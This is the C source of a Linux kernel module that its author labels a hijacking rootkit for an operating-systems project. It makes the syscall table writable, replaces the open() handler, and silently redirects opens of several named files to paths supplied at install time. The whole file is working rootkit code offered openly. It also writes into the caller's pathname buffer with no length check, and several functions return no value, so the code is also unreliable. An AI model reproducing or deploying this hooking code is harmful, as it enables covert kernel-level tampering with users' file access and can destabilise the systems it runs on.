
//intercepting the open system call

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h> 
#include <linux/errno.h> 
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>  
#include <asm/page.h>  
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <asm/string.h>

unsigned long *syscall_table;
char* my_path;
char* my_path2;
char* my_path3;
char* my_path4;
asmlinkage int (*original_open)(const char *pathname, int flags);

//module_param_array(name,type,num,perm); ->prototype for module_param
//the insmod call takes 5 arguments from command line

module_param(syscall_table, ulong, S_IRUGO); 
module_param(my_path, charp, S_IRUGO);  
module_param(my_path2, charp, S_IRUGO);
module_param(my_path3, charp, S_IRUGO);  
module_param(my_path4, charp, S_IRUGO);   
// S_IRUGO for a parameter that can be read by the world but cannot be changed

int set_addr_rw(long unsigned int _addr)   //change syscall table memory page from read only to read write mode 
{
    unsigned int level;
    pte_t *pte = lookup_address(_addr, &level);

    if (pte->pte &~ _PAGE_RW) 
      pte->pte |= _PAGE_RW;
}

int set_addr_ro(long unsigned int _addr) //change syscall table memory page from  read write mode to read only 
{
    unsigned int level;
    pte_t *pte = lookup_address(_addr, &level);

    pte->pte = pte->pte &~_PAGE_RW;
}

asmlinkage int new_open(const char *pathname, int flags) {

    // hijacked open
 
    int res;

    if(strstr(pathname, ".mp4") != NULL && strstr(pathname, "2minute") != NULL) {   //hijacking 2minute.mp4
    	printk(KERN_ALERT "OPEN HIJACKED 1st file %s\n", pathname);
	memcpy(pathname, my_path, strlen(my_path)+1);
    }
    if(strstr(pathname, ".mp4") != NULL && strstr(pathname, "5minute") != NULL) {   //hijacking 5minute.mp4
    	printk(KERN_ALERT "OPEN HIJACKED 2nd file %s\n", pathname);
	memcpy(pathname, my_path2, strlen(my_path2)+1);
    }
    if(strstr(pathname, ".txt") != NULL && strstr(pathname, "ameen") != NULL) {   //hijacking ameen.txt
    	printk(KERN_ALERT "OPEN HIJACKED 3rd file %s\n", pathname);
	memcpy(pathname, my_path3, strlen(my_path3)+1);
    }
     if(strstr(pathname, ".jpg") != NULL && strstr(pathname, "linux") != NULL) {   //hijacking linux.jpg
    	printk(KERN_ALERT "OPEN HIJACKED 4th file %s\n", pathname);
	memcpy(pathname, my_path4, strlen(my_path4)+1);
}
    return (*original_open)(pathname, flags);
}

static int init(void) { //loading the module

    printk(KERN_ALERT "\nHIJACK INIT\n");

    set_addr_rw((unsigned long)syscall_table); //change to read write

    original_open = (void *)syscall_table[__NR_open];  //saving original path
    syscall_table[__NR_open] = new_open;               //setting the new path
 
    //GPF_ENABLE;

    return 0;
}

static void exit(void) { //unloading the module

    syscall_table[__NR_open] = original_open;   //setting back to original path
    set_addr_ro((unsigned long)syscall_table);  //set permisssion back to read only

    //GPF_DISABLE;    

    printk(KERN_ALERT "MODULE EXIT\n");

    return;
}


MODULE_LICENSE("GPL");
MODULE_AUTHOR("JoeAmeenNitinJaved");
MODULE_DESCRIPTION("Hijacking Rootkit DEveloped for Os Project");
module_init(init);
module_exit(exit);

